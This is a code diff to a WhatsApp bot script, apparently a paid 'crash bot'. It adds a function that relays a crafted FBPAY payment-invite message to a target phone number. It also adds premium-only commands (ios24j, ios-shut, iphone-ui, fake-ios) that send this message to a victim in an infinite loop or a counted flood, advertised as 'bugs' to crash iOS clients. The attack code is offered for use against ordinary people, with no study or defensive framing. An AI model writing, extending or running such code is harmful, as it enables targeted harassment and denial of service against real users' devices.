@@ -747,7 +747,9 @@ async function sendMixedMessages(jid, count) {
     await sleep(500);
   }
 }
-
+async function aipong(target) {
+await deltacrashx.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
+}
 function sendMessageWithMentions(text, mentions = [], quoted = false) {
   if (quoted == null || quoted == undefined || quoted == false) {
     return deltaxcrash.sendMessage(m.chat, {
@@ -1120,6 +1122,41 @@ deltaxcrash.sendMessage(m.chat, {
  `
 deltaxcrash.sendMessage(m.chat, { 
 	           text: menyu,
+                    contextInfo: {
+                        externalAdReply: {
+                            showAdAttribution: false,
+                            title: global.namabot,
+                            body: global.namaCreator,
+                            thumbnailUrl: 'https://telegra.ph/file/1acb8cf39e54409b8621a.jpg', 
+                            sourceUrl: global.isLink,
+                            mediaType: 1,
+                            renderLargerThumbnail: true
+                        }
+                    }
+                }, {
+                    quoted: m
+                    })
+                    }
+	 break
+case 'iosbugs':{	
+let sami =
+`   \`𝐃𝚵𝛁𝚰𝐋 𝐒𝚸𝚰𝐃𝚵𝚪-𝛁6\`
+         
+┏━━━━━━━━━━━━━━━━━━
+┃  ❖ 𝙷𝙴𝙻𝙻𝙾 @${sender.split("@")[0]}
+┃  ❖ 𝚁𝚄𝙽𝚃𝙸𝙼𝙴  : ${runtime(process.uptime())}
+┗━━━━━━━━━━━━━━━━━
+┏━━━━━━━━━━━━━━━━━   
+┃⬮ ios24j <254xxx>
+┃⬮ iphone-ui <254xxx>
+┃⬮ ios-shut <254xxx>
+┃⬮ fake-ios <254xxx>
+┗━━━━━━━━━━━━━━━━━
+  
+ © 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒
+ `
+deltaxcrash.sendMessage(m.chat, { 
+	           text: sami,
                     contextInfo: {
                         externalAdReply: {
                             showAdAttribution: false,
@@ -1648,6 +1685,37 @@ if (!isPremium) return reply('_</> Can only be used by premium users..._')
   );
 }
 break;
+case 'ios24j': case 'ios-shut': {
+if (!isPremium) return reply(mess.premium)
+if (!q) return reply(`use .${command} 254392784527`)
+let bijipler = q.replace(/[^0-9]/g, "")
+if (bijipler.startsWith('0')) return reply(`<!> Use Number without Country Code\n\n<✓> Example : .${command} 254392784527`)
+await reply(mess.bugrespon)
+let target = bijipler + '@s.whatsapp.net'
+  for (;;) {
+    await aipong(target)
+    await sleep(1200)
+  }
+}
+break
+case 'iphone-ui': case 'fake-ios': {
+if (!isPremium) return reply(mess.premium)
+if (!q) return reply(`use .${command} 254392784527|1\n#  300.seconds`)
+let ppek = q.split("|")[0]
+let bijipler = ppek.replace(/[^0-9]/g, "")
+if (bijipler.startsWith('0')) return joreply(`<!> use number with country code\n\n<✓> Example : .${command} 254392784527|1`)
+let target = bijipler+"@s.whatsapp.net"
+let jumlah = q.split("|")[1] * 200
+let ppk = jumlah * 1.5
+m.reply(ppk + " seconds");
+reply(mess.bugrespon)
+for (let j = 0; j < jumlah; j++) {
+await aipong(target)
+await sleep(1500)
+}
+reply(`👤 Succes Send Bug Ke ${target} to the target ${ppk} seconds`)
+}
+break
 case "spider-web": {
 
 if (!isPremium) return reply('_</> Can only be used by premium users..._')
